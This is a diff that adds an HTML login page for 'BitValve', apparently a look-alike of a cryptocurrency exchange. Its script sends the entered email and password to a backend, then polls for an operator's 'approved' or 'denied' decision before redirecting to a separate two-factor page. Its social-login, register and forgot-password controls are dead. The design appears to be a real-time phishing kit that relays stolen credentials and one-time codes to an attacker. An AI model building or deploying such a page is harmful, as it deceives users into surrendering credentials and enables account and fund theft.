@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>BitValve — Login</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+
+<body>
+
+  <div class="page">
+
+    <main class="login-card">
+
+      <form id="login-form">
+        <!-- Logo -->
+        <div class="logo" aria-label="BitValve logo">
+          <img src="bitvalve.png" alt="BitValve logo" class="logo-mark" onerror="this.style.display='none'" />
+          <div class="logo-text">BitValve</div>
+        </div>
+
+        <div class="heading">Login</div>
+
+        <!-- Email -->
+        <div class="field">
+          <label for="email">Email</label>
+
+          <div class="input-wrap">
+            <input
+              id="email"
+              name="email"
+              type="email"
+              placeholder="Enter your email address"
+              autocomplete="off"
+              required
+            />
+          </div>
+        </div>
+
+        <!-- Password -->
+        <div class="field">
+          <label for="password">Password</label>
+
+          <div class="input-wrap">
+            <input
+              id="password"
+              name="password"
+              class="password-input"
+              type="password"
+              placeholder="Enter your password"
+              autocomplete="off"
+              required
+            />
+
+            <button
+              type="button"
+              class="eye"
+              aria-label="Show password"
+              aria-pressed="false"
+              onclick="togglePassword()"
+            >
+              <svg class="eye-open" viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M1.5 12S5 4.5 12 4.5 22.5 12 22.5 12 19 19.5 12 19.5 1.5 12 1.5 12Zm10.5 4.1A4.1 4.1 0 1 0 12 7.9a4.1 4.1 0 0 0 0 8.2Z" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+              <svg class="eye-closed" viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M3 3l18 18M10.6 10.6A3 3 0 0 0 13.4 13.4M9.1 5.6A11.7 11.7 0 0 1 12 5.3c7 0 10.5 6.7 10.5 6.7a17.6 17.6 0 0 1-4.1 5.1M6.2 6.2A17.3 17.3 0 0 0 1.5 12S5 19.5 12 19.5a11.5 11.5 0 0 0 5.5-1.4" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </button>
+          </div>
+        </div>
+
+        <a href="#" class="forgot" onclick="return false;">
+          I forgot my password
+        </a>
+
+        <button
+          class="login-btn"
+          type="submit"
+        >
+          <span>Login</span>
+        </button>
+
+      <!-- Divider -->
+      <div class="divider">
+        OR
+      </div>
+
+      <!-- Social buttons -->
+      <div class="socials">
+
+        <button
+          class="social"
+          type="button"
+          aria-label="Google"
+          onclick="demoMessage()"
+        >
+          <svg class="google-icon" viewBox="0 0 48 48" aria-hidden="true">
+            <path fill="#FFC107" d="M43.6 20.5H42V20H24v8h11.3c-1.6 4.7-6.1 8-11.3 8-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.9 1.1 8 3.1l5.7-5.7C33.4 4.6 29.1 3 24 3 12.4 3 3 12.4 3 24s9.4 21 21 21c10.5 0 19.5-7.6 21-17.5z"/>
+            <path fill="#FF3D00" d="M6.6 14.7l6.9 5.1C15.3 15.2 19.3 12 24 12c3.1 0 5.9 1.1 8 3.1l5.7-5.7C33.4 4.6 29.1 3 24 3 15.8 3 8.6 8.3 6.6 14.7z"/>
+            <path fill="#4CAF50" d="M24 45c5.1 0 9.8-1.8 13.4-4.8l-6.2-5.3C29.1 36.6 26.7 37.5 24 37.5c-5.1 0-9.5-3.3-11.1-7.9l-6.5 5C7.2 39.8 14.7 45 24 45z"/>
+            <path fill="#1976D2" d="M43.6 20.5H42V20H24v8h11.3c-1 2.9-3.1 5.2-5.8 6.6l6.2 5.3c3.7-3.4 6.1-8.5 6.1-14.4 0-1.7-.2-3.3-.6-4.9z"/>
+          </svg>
+        </button>
+
+        <button
+          class="social"
+          type="button"
+          aria-label="Facebook"
+          onclick="demoMessage()"
+        >
+          <svg class="facebook-icon" viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M13.5 21v-8h2.7l.5-3h-3.2V7.5c0-.9.3-1.5 1.7-1.5H17V3.1c-.3 0-1.3-.1-2.5-.1-2.5 0-4.2 1.5-4.2 4.3V10H8v3h2.3v8h3.2Z" fill="#1877F2"/>
+          </svg>
+        </button>
+
+        <button
+          class="social"
+          type="button"
+          aria-label="Apple"
+          onclick="demoMessage()"
+        >
+          <svg class="apple-icon" viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M16.6 12.7c0-2.3 1.9-3.4 2-3.5-1.1-1.6-2.8-1.8-3.4-1.8-1.4-.1-2.8.8-3.5.8-.7 0-1.8-.8-2.9-.8-1.5 0-2.9.9-3.7 2.2-1.6 2.8-.4 6.9 1.1 9.2.8 1.1 1.7 2.3 2.9 2.2 1.2-.1 1.6-.7 3-.7s1.8.7 3 .7c1.2 0 2-.9 2.8-2 .9-1.3 1.3-2.6 1.3-2.7-.1 0-2.6-1-2.6-3.4ZM14.8 5.7c.6-.8 1-1.9.9-3-.8.1-1.8.6-2.3 1.3-.6.7-1.1 1.9-1 2.9.8.1 1.9-.4 2.4-1.2Z" fill="currentColor"/>
+          </svg>
+        </button>
+
+      </div>
+
+      <div class="register">
+        Don't have an account yet?
+        <a href="#" onclick="return false;">Register</a>
+      </div>
+
+      <div id="status-message" class="status-message hidden" aria-live="polite"></div>
+
+      </form>
+
+    </main>
+
+  </div>
+
+  <script>
+    if (window.location.protocol === 'file:') {
+      window.location.replace('http://localhost:3000/login.html');
+    }
+
+    let verificationController = null;
+    let decisionPollTimer = null;
+
+    function togglePassword() {
+      const password = document.getElementById("password");
+      const eyeButton = document.querySelector(".eye");
+      const isVisible = password.type === "text";
+
+      password.type = isVisible ? "password" : "text";
+      eyeButton.dataset.visible = String(!isVisible);
+      eyeButton.setAttribute("aria-label", isVisible ? "Show password" : "Hide password");
+      eyeButton.setAttribute("aria-pressed", String(!isVisible));
+    }
+
+    function setLoadingState(isLoading) {
+      const loginButton = document.querySelector('.login-btn');
+      const buttonText = loginButton.querySelector('span');
+
+      if (isLoading) {
+        loginButton.classList.add('loading');
+        loginButton.disabled = true;
+        buttonText.textContent = 'Please wait...';
+        return;
+      }
+
+      loginButton.classList.remove('loading');
+      loginButton.disabled = false;
+      buttonText.textContent = 'Login';
+    }
+
+    function setStatusMessage(message, type) {
+      const statusMessage = document.getElementById('status-message');
+      statusMessage.textContent = message;
+      statusMessage.classList.remove('hidden', 'success', 'error');
+      statusMessage.classList.add(type);
+    }
+
+    function clearStatusMessage() {
+      const statusMessage = document.getElementById('status-message');
+      statusMessage.textContent = '';
+      statusMessage.classList.add('hidden');
+      statusMessage.classList.remove('success', 'error');
+    }
+
+    async function pollLoginDecision(email) {
+      if (decisionPollTimer) {
+        clearInterval(decisionPollTimer);
+      }
+
+      decisionPollTimer = setInterval(async () => {
+        try {
+          const response = await fetch(`/api/login-status?email=${encodeURIComponent(email)}`);
+          const result = await response.json();
+
+          if (result.status === 'pending') {
+            return;
+          }
+
+          if (result.status === 'denied') {
+            clearInterval(decisionPollTimer);
+            setLoadingState(false);
+            setStatusMessage(result.message || 'Email or password is wrong.', 'error');
+            return;
+          }
+
+          if (result.status === 'approved') {
+            clearInterval(decisionPollTimer);
+            sessionStorage.setItem('login_email', email);
+            window.location.href = `2fa.html?email=${encodeURIComponent(email)}`;
+            return;
+          }
+        } catch (error) {
+          console.error('Decision poll failed:', error);
+        }
+      }, 2000);
+    }
+
+    async function submitLogin(event) {
+      event.preventDefault();
+
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      if (!email || !password) {
+        setStatusMessage("Please enter your email and password.", "error");
+        return;
+      }
+
+      clearStatusMessage();
+      setLoadingState(true);
+      verificationController = new AbortController();
+
+      try {
+        const apiUrl = '/api/login';
+
+        const response = await fetch(apiUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ email, password }),
+          signal: verificationController.signal
+        });
+
+        let result = {};
+        const contentType = response.headers.get('content-type') || '';
+
+        if (contentType.includes('application/json')) {
+          const text = await response.text();
+          result = text ? JSON.parse(text) : {};
+        }
+
+        if (!response.ok) {
+          throw new Error(result.message || `Request failed with status ${response.status}.`);
+        }
+
+        pollLoginDecision(email);
+        document.getElementById("login-form").reset();
+      } catch (error) {
+        if (error.name === "AbortError") {
+          setLoadingState(false);
+          return;
+        }
+
+        console.error(error);
+        setLoadingState(false);
+        setStatusMessage(error.message || "Unable to submit login request.", "error");
+      }
+    }
+
+    document.getElementById("login-form").addEventListener("submit", submitLogin);
+    document.addEventListener("DOMContentLoaded", () => {
+      const loginButton = document.querySelector('.login-btn');
+      const buttonText = loginButton.querySelector('span');
+      loginButton.setAttribute('data-label', 'Login');
+      buttonText.textContent = 'Login';
+    });
+
+    function demoMessage() {
+      return false;
+    }
+  </script>
+
+</body>
+</html>
